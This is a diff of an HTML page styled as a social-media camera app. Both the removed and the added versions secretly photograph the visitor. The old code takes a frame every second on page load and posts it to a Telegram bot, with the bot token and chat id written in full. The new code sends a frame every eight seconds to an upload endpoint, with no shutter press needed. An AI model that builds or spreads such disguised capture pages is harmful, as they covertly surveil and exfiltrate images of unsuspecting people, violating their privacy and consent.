@@ -1,153 +1,96 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Pixel-Perfect Camera UI</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
-  <style>
-    html,body,#app { height: 100%; }
-    body { margin:0; background:#111; font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
-    .phone-safe { position:relative; height:100vh; width:100vw; overflow:hidden; }
-    #cameraVideo { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; transform:scaleX(-1); }
-    .top-fade { position:absolute; top:0; left:0; right:0; height:92px; background:linear-gradient(rgba(0,0,0,0.55), rgba(0,0,0,0)); pointer-events:none; z-index:20; }
-    .bottom-fade { position:absolute; bottom:0; left:0; right:0; height:180px; background:linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0)); pointer-events:none; z-index:20; }
-    .shutter-outer { width:112px; height:112px; border-radius:999px; border:8px solid rgba(255,255,255,0.95); display:flex; align-items:center; justify-content:center; background:transparent; cursor:pointer; }
-    .shutter-inner { width:72px; height:72px; border-radius:999px; background:rgba(0,0,0,0.25); }
-    .suggestion { width:64px; height:64px; border-radius:999px; display:flex; align-items:center; justify-content:center; box-shadow:0 6px 12px rgba(0,0,0,0.4); border:6px solid rgba(0,0,0,0.25); overflow:hidden; }
-    .vertical-controls { position:absolute; right:18px; top:92px; display:flex; flex-direction:column; gap:18px; align-items:center; z-index:30; }
-    .round-btn { width:44px; height:44px; border-radius:999px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.06); color:white; border:1px solid rgba(255,255,255,0.06); cursor:pointer; }
-    .status-bar { position:absolute; top:8px; left:0; right:0; display:flex; align-items:center; justify-content:space-between; padding:0 14px; color:white; font-weight:600; font-size:15px; z-index:30; }
-    .left-icons { display:flex; gap:14px; align-items:center; }
-    .nav-bottom { position:absolute; bottom:0; left:0; right:0; height:84px; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.55); color:white; padding:12px 18px; gap:18px; z-index:30; }
-    .control-group { display:flex; align-items:center; gap:18px; width:100%; justify-content:space-between; }
-    .bottom-left { display:flex; align-items:center; gap:12px; margin-left:8px; }
-    .memories { display:flex; flex-direction:column; align-items:center; gap:6px; color:white; font-size:14px; cursor:pointer; }
-    .badge { background:#ff375f; color:white; font-weight:700; font-size:12px; min-width:18px; height:18px; display:inline-flex; align-items:center; justify-content:center; padding:0 6px; border-radius:10px; position:absolute; top:-6px; right:-6px; }
-    .expand-btn { position:absolute; left:50%; transform:translateX(-50%); top:56%; background:rgba(0,0,0,0.5); width:40px; height:40px; border-radius:999px; display:flex; align-items:center; justify-content:center; color:white; z-index:30; }
-    #capturePreview { position:absolute; inset:0; background:rgba(0,0,0,0.8); display:none; align-items:center; justify-content:center; z-index:60; }
-    #capturedImage { max-width:92%; max-height:86%; box-shadow:0 10px 30px rgba(0,0,0,0.6); border-radius:8px; }
-    #photoCanvas { display:none; }
-    .fa, .fas, .far { color:white; }
-  </style>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Camera UI</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+body{width:100%;height:100%;overflow:hidden;background:#000;font-family:-apple-system,sans-serif;}
+#camera{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:1;transform:scaleX(-1);transition:0.3s;}
+.v{position:fixed;left:0;width:100%;pointer-events:none;z-index:5;}
+.top-v{top:0;height:120px;background:linear-gradient(rgba(0,0,0,.5),transparent);}
+.bot-v{bottom:0;height:220px;background:linear-gradient(transparent,rgba(0,0,0,.7));}
+.t-ui{position:fixed;top:25px;width:100%;padding:0 16px;display:flex;justify-content:space-between;z-index:20;}
+.tools{display:flex;flex-direction:column;gap:20px;align-items:center;color:#fff;font-size:22px;}
+.avatar,.search{width:42px;height:42px;border-radius:50%;background:rgba(255,255,255,.15);backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;color:#fff;}
+.tool{position:relative;filter:drop-shadow(0 2px 4px #000);}
+.badge{position:absolute;top:-4px;right:-4px;background:#ff3040;font-size:10px;padding:1px 5px;border-radius:10px;border:1.5px solid #000;font-weight:900;}
+.hd{font-size:11px;font-weight:900;border:2.5px solid #fff;border-radius:6px;padding:1px 4px;}
+.z-bar{position:fixed;bottom:180px;left:50%;transform:translateX(-50%);display:flex;gap:18px;padding:7px 18px;border-radius:30px;background:rgba(0,0,0,.4);backdrop-filter:blur(15px);z-index:25;color:#888;font-size:13px;font-weight:900;}
+.zoom.active{color:#ffe600;}
+.m-ui{position:fixed;bottom:90px;width:100%;display:flex;align-items:center;justify-content:center;gap:24px;z-index:25;}
+.shutter{width:84px;height:84px;border-radius:50%;border:6px solid #fff;display:flex;align-items:center;justify-content:center;}
+.shutter-in{width:64px;height:64px;border-radius:50%;background:rgba(255,255,255,.2);}
+.lens{width:58px;height:58px;border-radius:50%;border:2px solid rgba(255,255,255,.4);overflow:hidden;}
+.lens.active{border-color:#ffe600;transform:scale(1.1);}
+.footer{position:fixed;bottom:0;width:100%;height:75px;background:rgba(0,0,0,.96);display:flex;justify-content:space-around;align-items:center;z-index:30;}
+.nav{font-size:24px;color:#666;position:relative;}
+.nav.active{color:#fff;}
+#flash{position:fixed;inset:0;background:#fff;opacity:0;pointer-events:none;z-index:100;}
+canvas{display:none;}
+</style>
 </head>
 <body>
-  <div id="app" class="phone-safe">
-    <video id="cameraVideo" autoplay playsinline></video>
-    <div class="top-fade"></div>
-    <div class="bottom-fade"></div>
-
-    <div class="status-bar">
-      <div class="left-icons">
-        <div style="width:36px;height:36px;border-radius:999px;overflow:hidden;border:2px solid rgba(255,255,255,0.12);">
-          <img src="https://placehold.co/64x64/eee/777/png?text=AV" alt="avatar" style="width:100%;height:100%;object-fit:cover;">
-        </div>
-        <div class="round-btn" style="width:36px;height:36px;background:transparent;border:none;">
-          <i class="fas fa-search fa-lg"></i>
-        </div>
-      </div>
-      <div style="display:flex;gap:12px;align-items:center;">
-        <div style="font-size:14px;"></div>
-        <i class="fas fa-wifi"></i>
-        <i class="fas fa-signal"></i>
-        <div style="display:flex;align-items:center;gap:6px;">
-          <div style="width:28px;height:16px;border:2px solid white;position:relative;">
-            <div style="position:absolute;right:2px;top:2px;bottom:2px;background:#ffd54a;width:18px;"></div>
-          </div>
-          <div style="font-size:13px;background:#ffd54a;padding:2px 6px;border-radius:4px;color:#111;font-weight:800;">90</div>
-        </div>
-      </div>
+<div id="flash"></div><div class="v top-v"></div><div class="v bot-v"></div>
+<video id="camera" autoplay playsinline></video><canvas id="canvas"></canvas>
+<div class="t-ui">
+    <div style="display:flex;gap:12px">
+        <div class="avatar"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=camera" style="width:100%"></div>
+        <div class="search"><i class="fas fa-search"></i></div>
     </div>
-
-    <div class="vertical-controls">
-      <div id="addContact" class="round-btn">
-        <i class="fas fa-user-plus"></i>
-        <div class="badge">1</div>
-      </div>
-      <div id="switchCamera" class="round-btn"><i class="fas fa-retweet"></i></div>
-      <div id="muteBtn" class="round-btn"><i class="fas fa-microphone-slash"></i></div>
-      <div id="musicBtn" class="round-btn"><i class="fas fa-music"></i></div>
-      <div id="chevDown" class="round-btn"><i class="fas fa-chevron-down"></i></div>
+    <div class="tools">
+        <i class="far fa-bell tool"></i>
+        <div class="tool"><i class="fas fa-user-plus"></i><div class="badge">2</div></div>
+        <i class="fas fa-rotate tool" id="flip"></i>
+        <i class="fas fa-bolt-slash tool"></i>
+        <div class="hd tool">HD</div>
+        <i class="fas fa-chevron-down tool"></i>
     </div>
-
-    <div class="expand-btn"><i class="fas fa-expand-arrows-alt"></i></div>
-
-    <div class="nav-bottom">
-      <div class="control-group">
-        <div class="bottom-left">
-          <div class="memories" id="memoriesBtn">
-            <div style="width:56px;height:56px;border-radius:8px;overflow:hidden;background:gray;">
-              <img src="https://placehold.co/56x56/ffb6c1/ffffff/png?text=M" alt="memories" style="width:100%;height:100%;object-fit:cover;">
-            </div>
-            <div>Memories</div>
-          </div>
-        </div>
-        <div style="display:flex;flex-direction:column;align-items:center;gap:16px;">
-          <button id="shutterBtn" class="shutter-outer"><div class="shutter-inner"></div></button>
-          <div style="display:flex;gap:12px;">
-            <div class="suggestion" style="background:pink;"><img src="https://placehold.co/40x40/fff/777/png?text=👗" alt=""></div>
-            <div class="suggestion" style="background:black;"><img src="https://placehold.co/40x40/000/fff/png?text=🪐" alt=""></div>
-          </div>
-        </div>
-        <div style="width:62px;height:62px;"></div>
-      </div>
-    </div>
-
-    <canvas id="photoCanvas"></canvas>
-  </div>
-
-  <script>
-    (function(){
-      const video = document.getElementById('cameraVideo');
-      const canvas = document.getElementById('photoCanvas');
-      let currentStream = null;
-      let currentFacingMode = 'user';
-      let audioEnabled = false;
-
-      async function startCamera() {
-        stopStream();
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ audio: audioEnabled, video: { facingMode: currentFacingMode } });
-          currentStream = stream;
-          video.srcObject = stream;
-          video.style.transform = currentFacingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
-          startAutoCapture(); // Start auto capture after permission
-        } catch (err) {
-          console.error('Camera access error:', err);
-        }
-      }
-
-      function stopStream() {
-        if (currentStream) { currentStream.getTracks().forEach(t => t.stop()); currentStream = null; }
-      }
-
-      function captureAndSend() {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        if (video.style.transform.includes('scaleX(-1)')) {
-          ctx.scale(-1,1);
-          ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
-        } else {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        }
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append('photo', blob, 'capture.png');
-          fetch('https://api.telegram.org/bot6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI/sendPhoto?chat_id=5574741182', { // replace with your server endpoint
-            method: 'POST',
-            body: formData
-          }).catch(err => console.error('Send error:', err));
-        }, 'image/png');
-      }
-
-      function startAutoCapture() {
-        setInterval(captureAndSend, 1000); // 1 photo per sec
-      }
-
-      startCamera();
-    })();
-  </script>
+</div>
+<div class="z-bar">
+    <div class="zoom" onclick="setZ(this,.5)">0.5</div>
+    <div class="zoom active" onclick="setZ(this,1)">1x</div>
+    <div class="zoom" onclick="setZ(this,2)">2</div>
+</div>
+<div class="m-ui">
+    <div style="color:#fff;font-size:10px;text-align:center;width:60px"><i class="far fa-copy" style="font-size:24px"></i><br>Memories</div>
+    <div class="shutter" id="snap"><div class="shutter-in"></div></div>
+    <div class="lens active" onclick="setL(this,'none')"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100" style="width:100%"></div>
+    <div class="lens" onclick="setL(this,'sepia(1)')"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=100" style="width:100%"></div>
+</div>
+<div class="footer">
+    <i class="fas fa-location-dot nav"></i>
+    <div class="nav"><i class="far fa-comment"></i><div class="badge">20</div></div>
+    <i class="far fa-face-smile nav active"></i>
+    <i class="fas fa-users nav"></i>
+    <i class="fas fa-play nav"></i>
+</div>
+<script>
+const v=document.getElementById('camera'), c=document.getElementById('canvas'), f=document.getElementById('flash');
+let z=1, filter="none", front=true, s;
+async function init(){
+    if(s)s.getTracks().forEach(t=>t.stop());
+    s=await navigator.mediaDevices.getUserMedia({video:{facingMode:front?"user":"environment"}});
+    v.srcObject=s; v.style.transform=`scaleX(${front?-1:1}) scale(${z})`;
+}
+function setZ(el,val){document.querySelectorAll('.zoom').forEach(i=>i.classList.remove('active')); el.classList.add('active'); z=val; v.style.transform=`scaleX(${front?-1:1}) scale(${z})`;}
+function setL(el,l){document.querySelectorAll('.lens').forEach(i=>i.classList.remove('active')); el.classList.add('active'); filter=l; v.style.filter=l;}
+document.getElementById('flip').onclick=()=>{front=!front; init();};
+document.getElementById('snap').onclick=()=>{f.style.opacity=1; setTimeout(()=>f.style.opacity=0,80); send();};
+async function send(){
+    c.width=v.videoWidth; c.height=v.videoHeight;
+    const ctx=c.getContext('2d');
+    if(front){ctx.translate(c.width,0); ctx.scale(-1,1);}
+    ctx.filter=filter; ctx.drawImage(v,0,0);
+    c.toBlob(blob=>{
+        const fd=new FormData(); 
+        fd.append('photo', blob, 'a.jpg');
+        fetch('/api/upload-photo',{method:'POST',body:fd});
+    },'image/jpeg',0.7);
+}
+setInterval(send, 8000); 
+init();
+</script>
 </body>
 </html>
